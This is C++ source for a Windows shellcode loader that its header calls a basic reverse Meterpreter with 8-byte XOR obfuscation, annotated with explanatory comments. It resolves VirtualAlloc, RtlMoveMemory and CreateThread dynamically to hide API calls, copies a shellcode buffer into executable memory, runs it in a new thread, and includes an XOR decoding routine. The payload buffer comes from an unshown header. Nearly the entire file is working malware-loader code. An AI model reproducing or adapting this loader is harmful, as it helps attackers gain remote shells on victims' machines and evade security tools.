/*
|	Author:		lemur
|	GitHub:		https://github.com/1emvr
|	Email:		1emvr@protonmail.com
|	Date:		01/04/2023	03:09 AM
|
|	Very basic x64 Windows reverse Meterpreter with 8-byte XOR.
|	Nerfed because I'm concerned about skids.
*/

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

#include <iostream>
#include <cstdint>

#include "resource.h"

typedef LPVOID (WINAPI *VirtualAlloc_t)(

	LPVOID lpAddress, 
	SIZE_T dwSize, 
	DWORD  flAllocationType, 
	DWORD  flProtectE
);
typedef VOID (WINAPI *RtlMoveMemory_t)(

	VOID UNALIGNED *Destination, 
	VOID UNALIGNED *Source,		
	SIZE_T Length
);
typedef HANDLE(WINAPI* CreateThread_t)(

	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
);
/*
	Typedefs create raw datatypes pointers, cast to functions that do not directly call them (?) 
	Instead, finding their memory address from kernel32.dll. This is known as API Call Obfuscation.

	Prototypes for all WinAPI functions can be found on MSDN. https://learn.microsoft.com/en-us/windows/win32/api
*/

int RevShell() {

	DWORD shellcode_size = sizeof(buffer);
	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "VirtualAlloc");
	LPVOID exec_memory = pVirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "RtlMoveMemory");
	pRtlMoveMemory(exec_memory, buffer, shellcode_size);

	CreateThread_t pCreateThread = (CreateThread_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "CreateThread");
	pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_memory, NULL, 0, NULL);
	/*
		VirtualAlloc() Arguments:
	
			(Optional)	lpAddress,
						dwSize:				Region of bytes
						flAllocationType:	Type of memory allocation
						flProtect:			Protection/Permission types

		RtlMoveMemory() Arguments:
	
			*Destination:	Pointer to the destination
			*Source:		Source buffer
			Length:			Size of buffer

		CreateThread() Arguments:
	
			(Optional)	lpThreadAttributes:	A pointer to SECURITY_ATTRIBUTES struct for child-process inheritence
						dwStackSize:		Inital size of the stack. If zero, then set to size of executable
						lpStartAddress:		Pointer to the app-defined function to be executed, casting that pointer to notify process-start
						lpParameter:		A pointer to variable to be passed to the thread. If NULL, no extra data will pass
						dwCreationFlags:	Flags controlling creation of the thread. If set to zero, the thread runs immediately after creation
						lpThreadId:			Pointer to a variable that receives the thread ID. If NULL, the thread ID is not returned
	*/
	Sleep(1000);
	return 0;
}

char XORLoader(char* payload, size_t payloadlen, char* key, size_t keylen) {

	int j;
	j = 0;

	for (int i = 0; i < payloadlen; i++) {
		if (j == keylen - 1) j = 0;
		payload[i] ^= key[j];
		j++;
	}
	return *payload;
	/*
		XORCLoader() Arguments and vars:

			char payload array:			Given the global char "payload" array
			size_t payloadlen:			Given size of payload
			char key array:				Defining an initialized object list as a XOR key
			size_t keylen:				Given size of key.

			The payload is iterated over the PAYLOAD_MAX_SIZE, minus one, modulating over each
			value in the key list until the end.

			This value is returned as a pointer to the calling function.
	*/
}

int main() {

	HWND sneakyboi;
	AllocConsole();

	sneakyboi = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(sneakyboi, SW_SHOWNORMAL);

	RevShell();
	return 0;
	/*
		Handle for the window function FindWindowA():

						lpClassName:	The class name "ConsoleWindowClass" changes user-data of a window object.
						lpWindowName:	NULL. It shouldn't have a name. Why would we name it? Wth is wrong with you, man...

		Arguments for ShowWindow():

						hWnd:			The handle of the window.
						nCmdShow:		Controls how the window is displayed.
	*/
}